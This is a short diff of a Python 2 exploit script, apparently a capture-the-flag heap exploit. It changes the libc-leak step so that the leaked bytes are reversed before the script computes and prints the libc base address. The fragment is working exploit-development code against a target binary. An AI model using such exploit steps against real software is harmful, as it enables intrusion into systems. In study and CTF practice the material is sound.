@@ -43,7 +43,7 @@ if __name__ == '__main__':
     remove(0)
     show(0)
 
-    libcBase = b64(io.read_until('\x7f')[-6: ].ljust(8, '\x00')) - 88 - 0x3be760
+    libcBase = b64(io.read_until('\x7f')[-6: ].ljust(8, '\x00')[::-1]) - 88 - 0x3be760
     print "[*]libcBase -> {:#x}".format(libcBase)
     raw_input("")
 
